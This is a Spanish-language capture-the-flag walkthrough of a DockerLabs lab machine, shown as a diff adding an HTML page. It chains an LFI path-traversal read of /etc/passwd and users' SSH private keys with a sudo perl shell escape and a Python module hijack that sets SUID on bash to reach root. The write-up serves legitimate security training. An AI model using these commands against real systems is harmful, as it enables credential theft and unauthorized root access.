@@ -1,0 +1,298 @@
+I"�<<p>En esta práctica trabajaremos con una máquina de DockerLabs en la que explotaremos una vulnerabilidad de <em>Local File Inclusion (LFI)</em>. Gracias a esta falla obtendremos diferentes ventajas que nos permitirán avanzar en el proceso de explotación y, finalmente, apoderarnos de la máquina víctima.</p>
+
+<p><img src="image.png" alt="alt text" /></p>
+
+<p>Empezaremos haciendo un escaneo de puertos a la maquina <strong>Psycho</strong> con la herramienta <strong>Nmap</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> sudo nmap -p- --open -sSCV --min-rate 5000 -Pn -n -v 172.17.0.2 -oN escaneo
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">sudo</code></td>
+      <td>Se necesita privilegios de administrador para algunos tipos de escaneo (como los de tipo SYN).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">nmap</code></td>
+      <td>Herramienta para escaneo de redes y puertos.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-p-</code></td>
+      <td>Escanea <strong>todos los puertos</strong> (del 1 al 65535).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--open</code></td>
+      <td>Muestra <strong>solo los puertos abiertos</strong>, omite los cerrados y filtrados.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-sSCV</code></td>
+      <td>Combinación de opciones:  <br />• <code class="language-plaintext highlighter-rouge">-sS</code> = Escaneo <strong>SYN</strong> (rápido y sigiloso).  <br />• <code class="language-plaintext highlighter-rouge">-sC</code> = Usa <strong>scripts NSE básicos</strong>, equivalente a <code class="language-plaintext highlighter-rouge">--script=default</code>.  <br />• <code class="language-plaintext highlighter-rouge">-sV</code> = Detecta versiones de servicios.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--min-rate 5000</code></td>
+      <td>Intenta enviar <strong>al menos 5000 paquetes por segundo</strong> (muy rápido). ⚠️ Puede generar falsos positivos si la red no lo soporta bien.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Pn</code></td>
+      <td>No hace <strong>ping previo</strong> al host (asume que está vivo). Útil si ICMP está bloqueado.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-n</code></td>
+      <td>No resuelve nombres DNS (más rápido).</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-v</code></td>
+      <td>Modo <strong>verborreico</strong>: muestra más detalles durante el escaneo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">172.17.0.2</code></td>
+      <td>IP del objetivo.</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-oN escaneo</code></td>
+      <td>Guarda el resultado en un archivo llamado <code class="language-plaintext highlighter-rouge">escaneo</code> en formato <strong>legible para humanos</strong> (normal output).</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos muestra que esta maquina tiene 2 puerto abierto.</p>
+
+<ul>
+  <li>puerto 22 ssh version 9.6</li>
+  <li>puerto 80 http</li>
+</ul>
+
+<p><img src="image-1.png" alt="alt text" /></p>
+
+<p>Revisaremos el puerto 80 para ver que pagina esta corriendo por detrás.
+Vemos una pagina sencilla que hace alusión a un CTF . Revisamos el código fuente sin encontrar nada raro. En la pagina sale el nombre de <strong>TLuisillo_o</strong> tanto en el hero como el footer, esto podría ser un posible usuario.
+La pagina tiene 2 botones que no funcionan. uno en el nabvar y otro en el centro de la pagina hero.</p>
+
+<p><img src="image-2.png" alt="alt text" /></p>
+
+<p>También podemos ver que abajo sale un mensaje de error. Esto puede ser que se esta tratando tener acceso a algún archivo mal configurado.</p>
+
+<p><img src="image-3.png" alt="alt text" /></p>
+
+<p><img src="image-4.png" alt="alt text" /></p>
+
+<p>Usaremos la herramienta gobuster para ver si se encuentran directorios ocultos. Para ello usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,sh
+</code></pre></div></div>
+
+<p>Se encontraron algunos directorios.</p>
+
+<p><img src="image-5.png" alt="alt text" /></p>
+
+<p>Al revisar nos encontramos con un menú de apache donde hay una ruta que lleva a una imagen.</p>
+
+<p><img src="image-6.png" alt="alt text" /></p>
+
+<p>Al parecer es la imagen de fondo de la pagina encontrada en el puerto 80. Revise la imagen con la herramienta <strong>exiftool</strong> para ver si contenía algún dato oculto pero no conseguí nada.</p>
+
+<p><img src="image-7.png" alt="alt text" /></p>
+
+<p>Usare la herramienta <strong>wfuzz</strong> para ver si esta pagina es vulnerable a LFI (Local File Inclusión) ya que anteriormente se encontró en la pagina específicamente en el <strong>footer</strong> un mensaje de <strong>error</strong> por lo cual al parecer este intentando de llamar algún recurso de forma incorrecta. Usaremos el directorio que encontró <strong>index.php</strong> para ver si se trata de un LFI
+Para ello usaremos el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://172.17.0.2/index.php?FUZZ=../../../../../../../../../../etc/passwd'
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Componente</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">wfuzz</code></td>
+      <td>La herramienta para fuzzing web</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-c</code></td>
+      <td>Colorea la salida para mejor visualización en terminal</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt</code></td>
+      <td>Diccionario que contiene miles de nombres de archivos/directorios/comunes. En este caso, se está usando para probar <strong>nombres de parámetros HTTP</strong></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">'http://172.17.0.2/index.php?FUZZ=../../../../../../../../../../etc/passwd'</code></td>
+      <td>Este es el objetivo de fuzzing. La palabra clave <strong><code class="language-plaintext highlighter-rouge">FUZZ</code></strong> será reemplazada por cada palabra del diccionario</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Al parecer nos arroja demasiada información por lo cual filtraremos un poco para que solo nos muestre cuando haya encontrado algo. Aplicaremos un filtro por lineas. por lo tanto el comando seria el siguiente</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c --hl=62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt 'http://172.17.0.2/index.php?FUZZ=../../../../../../../../../../etc/passwd'
+</code></pre></div></div>
+
+<table>
+  <thead>
+    <tr>
+      <th>Opción</th>
+      <th>Significado</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">wfuzz</code></td>
+      <td>Herramienta de fuzzing para aplicaciones web</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-c</code></td>
+      <td>Muestra la salida con colores (para mayor claridad visual)</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">--hl=62</code></td>
+      <td><strong>Oculta respuestas que tienen exactamente 62 líneas</strong></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-w /usr/share/...txt</code></td>
+      <td>Lista de palabras (payloads) que van a reemplazar <code class="language-plaintext highlighter-rouge">FUZZ</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">'http://172.17.0.2/index.php?FUZZ=../../.../etc/passwd'</code></td>
+      <td>URL de prueba, donde <code class="language-plaintext highlighter-rouge">FUZZ</code> será reemplazado por cada palabra del diccionario</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="image-8.png" alt="alt text" /></p>
+
+<p>Encontró una coincidencia <strong>secret</strong>. Ahora veremos si funciona. Para ello usaremos la herramienta <strong>curl</strong>. Usaremos el siguiente comando</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl 'http://172.17.0.2/index.php?secret=../../../../../../../../../../etc/passwd'
+</code></pre></div></div>
+
+<h2 id="qué-hace-exactamente">¿Qué hace exactamente?</h2>
+
+<p>Este comando está intentando <strong>leer el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></strong> del sistema remoto usando una vulnerabilidad <strong>LFI</strong> a través del parámetro <code class="language-plaintext highlighter-rouge">secret</code> en el archivo <code class="language-plaintext highlighter-rouge">index.php</code>.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parte</th>
+      <th>Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">curl</code></td>
+      <td>Herramienta de línea de comandos para hacer peticiones HTTP</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">'http://172.17.0.2/index.php?secret=...'</code></td>
+      <td>La URL del servidor objetivo, con un parámetro GET llamado <code class="language-plaintext highlighter-rouge">secret</code> que probablemente esté siendo usado en el backend por <code class="language-plaintext highlighter-rouge">index.php</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">../../../../../../../../../../etc/passwd</code></td>
+      <td>Ruta relativa para intentar salir del directorio actual y alcanzar el archivo sensible del sistema operativo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="image-9.png" alt="alt text" /></p>
+
+<p>Tuvimos éxito. Ahora podemos ver 2 posibles usuarios <strong>vaxei</strong> y <strong>luisillo</strong> que posiblemente el segundo usuario sea el mismo <strong>TLuisillo</strong> de la pagina web.
+Intente usar <strong>hydra</strong> en los 2 usuarios encontrados para ver si encontraba alguna credencial para poder acceder por el puerto 22 ssh pero no se encontró nada.</p>
+
+<p><img src="image-10.png" alt="alt text" /></p>
+
+<p>Otra alternativa que podemos hacer es encontrar los archivos <strong>id_rsa</strong> de los 2 usuarios, aprovechando la vulnerabilidad LFI.</p>
+
+<h2 id="qué-es-id_rsa">¿Qué es <code class="language-plaintext highlighter-rouge">id_rsa</code>?</h2>
+
+<p><code class="language-plaintext highlighter-rouge">id_rsa</code> es la <strong>clave privada RSA</strong> utilizada para autenticarse en sistemas a través de <strong>SSH (Secure Shell)</strong>.</p>
+
+<p>Por defecto, se encuentra en:</p>
+
+<p><code class="language-plaintext highlighter-rouge">/home/&lt;usuario&gt;/.ssh/id_rsa</code></p>
+
+<p>Y su correspondiente clave pública está en:</p>
+
+<p><code class="language-plaintext highlighter-rouge">/home/&lt;usuario&gt;/.ssh/id_rsa</code></p>
+
+<h2 id="para-qué-sirve">¿Para qué sirve?</h2>
+
+<ul>
+  <li>
+    <p>La clave privada <code class="language-plaintext highlighter-rouge">id_rsa</code> permite iniciar sesión <strong>sin necesidad de contraseña</strong>, si el sistema remoto tiene la <strong>clave pública</strong> en su archivo <code class="language-plaintext highlighter-rouge">~/.ssh/authorized_keys</code>.</p>
+  </li>
+  <li>
+    <p>Es como tener <strong>la llave de una casa</strong>. Si obtienes <code class="language-plaintext highlighter-rouge">id_rsa</code> de un usuario y puedes usarla, puedes conectarte por SSH como ese usuario.</p>
+  </li>
+</ul>
+
+<p>Para ello pondremos el siguiente comando:</p>
+
+<p><strong>lusillo</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>view-source:http://172.17.0.2/index.php?secret=../../../../../../../../../../home/luisillo/.ssh/id_rsa
+</code></pre></div></div>
+
+<p><strong>vaxei</strong></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>view-source:http://172.17.0.2/index.php?secret=../../../../../../../../../../home/vaxei/.ssh/id_rsa
+</code></pre></div></div>
+
+<p>Tuvimos exito con el usuario <strong>vaxei</strong></p>
+
+<p><img src="image-11.png" alt="alt text" /></p>
+
+<p>Ahora queda abrir <strong>nano</strong> pegar esta <strong>id_rsa</strong> y darle permiso 600 para poder entrar por ssh.</p>
+
+<p><img src="image-12.png" alt="alt text" /></p>
+
+<p>Aplicamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code> para ver binarios vulnerables. Encontramos que podemos vulnerar con <strong>perl</strong> con el usuario <strong>luisillo</strong>.
+Consultando la pagina https://gtfobins.github.io/gtfobins/perl/#sudo nos da el comando para aprovechar esta vulnerabilidad.</p>
+
+<p>Lo adaptamos un poco</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u luisillo perl -e 'exec "/bin/bash"';'
+</code></pre></div></div>
+
+<p><img src="image-13.png" alt="alt text" /></p>
+
+<p>Hemos entrado al sistema como el usuario <strong>luisillo</strong>.</p>
+
+<p><img src="image-14.png" alt="alt text" /></p>
+
+<p>Aplicamos un <code class="language-plaintext highlighter-rouge">sudo -l</code> y nos dice que el usuario <strong>luisillo</strong> es capaz de ejecutar como root en python el script <strong>paw.py</strong></p>
+
+<p><img src="image-15.png" alt="alt text" /></p>
+
+<p>Vamos a la ubicación del archivo y ejecutamos el script. Nos da un error ya que esta intentando ejecutar otro script llamado <strong>subprocess.py</strong> pero este no existe. podríamos crear este script</p>
+
+<p><img src="image-16.png" alt="alt text" /></p>
+
+<p>Entonces crearemos un archivo llamado subprocess.py en el mismo directorio donde se encuentra el otro script paw.py. Abrimos con nano el script y agregamos lo siguiente.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os;
+os.system("chmod u+s /bin/bash")
+</code></pre></div></div>
+
+<p>Guardamos el archivo y luego ejecutamos el archivo <strong>paw.py</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u root /usr/bin/python3 /opt/paw.py
+</code></pre></div></div>
+
+<p>y por ultimo ponemos el siguiente comando</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash -p
+</code></pre></div></div>
+
+<p>Con esto seremos <strong>root</strong></p>
+
+<p><img src="image-17.png" alt="alt text" /></p>
+
+:ET
